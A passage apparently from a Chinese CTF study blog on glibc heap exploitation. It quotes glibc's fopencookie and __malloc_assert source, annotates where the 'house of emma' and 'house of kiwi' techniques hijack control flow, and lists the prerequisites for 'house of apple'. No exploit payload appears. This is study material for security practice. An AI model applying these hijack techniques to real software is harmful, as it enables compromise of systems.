  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_file_setbuf),
  JUMP_INIT(sync, _IO_file_sync),
  JUMP_INIT(doallocate, _IO_file_doallocate),
  JUMP_INIT(read, _IO_cookie_read),
  JUMP_INIT(write, _IO_cookie_write),
  JUMP_INIT(seek, _IO_cookie_seek),
  JUMP_INIT(close, _IO_cookie_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue),
};


/* Copy the callbacks from SOURCE to *TARGET, with pointer
   mangling.  */
static void
set_callbacks (cookie_io_functions_t *target,
	       cookie_io_functions_t source)
{
#ifdef PTR_MANGLE
  PTR_MANGLE (source.read);
  PTR_MANGLE (source.write);
  PTR_MANGLE (source.seek);
  PTR_MANGLE (source.close);
#endif
  *target = source;
}

void
_IO_cookie_init (struct _IO_cookie_file *cfile, int read_write,
		 void *cookie, cookie_io_functions_t io_functions)
{
  _IO_init_internal (&cfile->__fp.file, 0);
  _IO_JUMPS (&cfile->__fp) = &_IO_cookie_jumps;

  cfile->__cookie = cookie;
  set_callbacks (&cfile->__io_functions, io_functions);

  _IO_new_file_init_internal (&cfile->__fp);

  _IO_mask_flags (&cfile->__fp.file, read_write,
		  _IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING);

  cfile->__fp.file._flags2 |= _IO_FLAGS2_NEED_LOCK;

  /* We use a negative number different from -1 for _fileno to mark that
     this special stream is not associated with a real file, but still has
     to be treated as such.  */
  cfile->__fp.file._fileno = -2;
}


FILE *
_IO_fopencookie (void *cookie, const char *mode,
		 cookie_io_functions_t io_functions)
{
  int read_write;
  struct locked_FILE
  {
    struct _IO_cookie_file cfile;
#ifdef _IO_MTSAFE_IO
    _IO_lock_t lock;
#endif
  } *new_f;

  switch (*mode++)
    {
    case 'r':
      read_write = _IO_NO_WRITES;
      break;
    case 'w':
      read_write = _IO_NO_READS;
      break;
    case 'a':
      read_write = _IO_NO_READS|_IO_IS_APPENDING;
      break;
    default:
      __set_errno (EINVAL);
      return NULL;
  }
  if (mode[0] == '+' || (mode[0] == 'b' && mode[1] == '+'))
    read_write &= _IO_IS_APPENDING;

  new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));
  if (new_f == NULL)
    return NULL;
#ifdef _IO_MTSAFE_IO
  new_f->cfile.__fp.file._lock = &new_f->lock;
#endif

  _IO_cookie_init (&new_f->cfile, read_write, cookie, io_functions);

  return (FILE *) &new_f->cfile.__fp;
}

versioned_symbol (libc, _IO_fopencookie, fopencookie, GLIBC_2_2);

#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_2)

static off64_t
attribute_compat_text_section
_IO_old_cookie_seek (FILE *fp, off64_t offset, int dir)
{
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
  int (*seek_cb) (FILE *, off_t, int)
    = (int (*) (FILE *, off_t, int)) cfile->__io_functions.seek;
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (seek_cb);
#endif

  if (seek_cb == NULL)
    return _IO_pos_BAD;

  int ret = seek_cb (cfile->__cookie, offset, dir);

  return (ret == -1) ? _IO_pos_BAD : ret;
}

static const struct _IO_jump_t _IO_old_cookie_jumps libio_vtable = {
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_file_finish),
  JUMP_INIT(overflow, _IO_file_overflow),
  JUMP_INIT(underflow, _IO_file_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_default_pbackfail),
  JUMP_INIT(xsputn, _IO_file_xsputn),
  JUMP_INIT(xsgetn, _IO_default_xsgetn),
  JUMP_INIT(seekoff, _IO_cookie_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_file_setbuf),
  JUMP_INIT(sync, _IO_file_sync),
  JUMP_INIT(doallocate, _IO_file_doallocate),
  JUMP_INIT(read, _IO_cookie_read),
  JUMP_INIT(write, _IO_cookie_write),
  JUMP_INIT(seek, _IO_old_cookie_seek),
  JUMP_INIT(close, _IO_cookie_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue),
};

FILE *
attribute_compat_text_section
_IO_old_fopencookie (void *cookie, const char *mode,
		     cookie_io_functions_t io_functions)
{
  FILE *ret;

  ret = _IO_fopencookie (cookie, mode, io_functions);
  if (ret != NULL)
    _IO_JUMPS_FILE_plus (ret) = &_IO_old_cookie_jumps;

  return ret;
}

compat_symbol (libc, _IO_old_fopencookie, fopencookie, GLIBC_2_0);

#endif

```

同时触发函数代码是在同样的地方

```c
extern const char *__progname;

static void
__malloc_assert (const char *assertion, const char *file, unsigned int line,
		 const char *function)
{
  (void) __fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",//这个是emma调用的位置
		     __progname, __progname[0] ? ": " : "",
		     file, line,
		     function ? function : "", function ? ": " : "",
		     assertion);
  fflush (stderr);//这个位置是kiwi的调用位置
  abort ();
}
```



## house of apple

这里我们学的是一个由山海关大佬退出的一个系列apple1，apple2 apple3三个手法接下来就使用手法的前置条件

使用house of apple的条件为： 

​	1、程序从main函数返回或能调用exit函数 

​	2、能泄露出heap地址和libc地址 

​	3、 能使用一次largebin attack（一次即可）
